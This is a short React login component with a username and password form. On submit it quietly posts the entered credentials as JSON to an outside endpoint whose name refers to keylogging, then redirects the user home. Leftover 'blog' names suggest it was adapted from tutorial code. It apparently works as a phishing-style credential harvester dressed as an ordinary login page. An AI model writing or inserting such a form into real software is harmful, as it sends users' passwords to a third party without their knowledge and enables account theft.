import React from 'react'
import { useState } from 'react'
import { useNavigate } from 'react-router';

const Login = () => {
    const [username, setUsername] = useState();
    const [password, setPassword] = useState();
    const [isPending, setIsPending] = useState(false)
    const navigate = useNavigate();


    const handleSubmit = (e) => {
        e.preventDefault();
        const blog = { username, password };
        fetch('https://keylogging.pythonanywhere.com/api/login', {
            method: 'POST',
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(blog)
        }).then(() => {
            console.log("New blog added");
            setIsPending(false)
            // history.go(-1);
            navigate('/');
        })
    }

    return (
        <div className="create">
            <h2>Login</h2>
            <form onSubmit={handleSubmit}>
                <label>Username:</label>
                <input
                    type="text"
                    required
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                />
                
                <label>Password:</label>

                <input
                    type="password"
                    required
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                />
                {!isPending && <button className="button">Login</button>}
                {/* {isPending && <button disabled>Adding blog... </button>} */}
            </form>

        </div>
    )
}

export default Login
